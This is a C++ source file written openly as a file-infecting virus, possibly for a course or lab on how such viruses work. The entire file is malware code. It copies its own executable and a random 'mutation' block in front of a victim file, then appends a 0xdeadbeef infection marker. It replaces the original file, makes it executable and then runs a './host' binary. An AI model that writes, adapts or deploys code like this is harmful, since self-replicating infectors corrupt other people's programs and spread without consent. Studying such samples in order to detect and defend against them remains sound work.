// Imports
#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdint>
#include <unistd.h>
#include <sys/stat.h>
#include <ctime>
#include <cstdlib>

// Size of the random mutation block (adjust as needed)
const size_t MUTATION_SIZE = 16;

/**
 * @brief Executes the host program.
 *
 * This function calls the `execv` system function to replace the current
 * process image with the executable for the host program (`./host`).
 */
void execute_host() {
    char* const args[] = { const_cast<char*>("./host"), nullptr };
    execv("./host", args);  // Execute the host binary
}

/**
 * @brief Checks if a file is infected.
 *
 * @param filename The name of the file to check.
 * @return true if the file contains the infection sentinel (0xdeadbeef), false otherwise.
 */
bool is_infected(const char* filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) return false;

    uint32_t sentinel;
    file.seekg(-sizeof(uint32_t), std::ios::end);
    file.read(reinterpret_cast<char*>(&sentinel), sizeof(sentinel));
    return sentinel == 0xdeadbeef;
}

/**
 * @brief Adds a mutation block to the infected file.
 *
 * @param infected_file An output file stream for writing the mutated block.
 *
 * This function writes a randomly generated block of bytes to the file, creating a unique signature
 * for each infection.
 */
void mutate_virus(std::ofstream& infected_file) {
    // Initialize random seed based on current time
    std::srand(std::time(nullptr));

    // Generate a block of random bytes for mutation
    char mutation_block[MUTATION_SIZE];
    for (size_t i = 0; i < MUTATION_SIZE; ++i) {
        mutation_block[i] = static_cast<char>(std::rand() % 256);
    }

    // Write the mutation block to the infected file to create a unique signature
    infected_file.write(mutation_block, MUTATION_SIZE);
}

/**
 * @brief Infects a victim file with the virus.
 *
 * @param victim_name The name of the victim file to infect.
 * @param self_name The name of the current executable (virus) file.
 *
 * This function checks if the victim file is already infected. If not, it creates an infected version
 * by copying the virus code, applying a mutation, appending the original victim content, and adding a sentinel.
 */
void infect(const char* victim_name, const char* self_name) {
    if (is_infected(victim_name)) {
        return;  // Victim already infected
    }

    std::ifstream self_file(self_name, std::ios::binary);
    std::ifstream victim_file(victim_name, std::ios::binary | std::ios::ate);
    std::ofstream infected_file("infected_temp", std::ios::binary);

    if (!self_file || !victim_file || !infected_file) {
        std::cerr << "Error opening files for infection." << std::endl;
        return;
    }

    // Copy virus content
    infected_file << self_file.rdbuf();

    // Apply mutation to the copied virus section
    mutate_virus(infected_file);

    // Copy original victim content
    victim_file.seekg(0, std::ios::beg);
    infected_file << victim_file.rdbuf();

    // Append sentinel
    uint32_t sentinel = 0xdeadbeef;
    infected_file.write(reinterpret_cast<char*>(&sentinel), sizeof(sentinel));

    self_file.close();
    victim_file.close();
    infected_file.close();

    // Replace original victim with infected file
    if (std::rename("infected_temp", victim_name) != 0) {
        std::cerr << "Failed to rename infected file." << std::endl;
        return;
    }
    chmod(victim_name, S_IRWXU | S_IRGRP | S_IROTH);  // Make the file executable
}

/**
 * @brief Main entry point of the virus program.
 *
 * @param argc Argument count.
 * @param argv Argument vector containing command-line arguments.
 * @return 0 on successful execution, 1 if an error occurs.
 *
 * This function attempts to infect a victim file specified on the command line,
 * then executes the host program.
 */
int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <victim>" << std::endl;
        return 1;
    }

    const char* victim_name = argv[1];
    const char* self_name = argv[0];  // Use argv[0] to pass self-reference

    // Attempt to infect the victim file
    infect(victim_name, self_name);

    // Call the host binary to display the message
    execute_host();

    return 0;
}
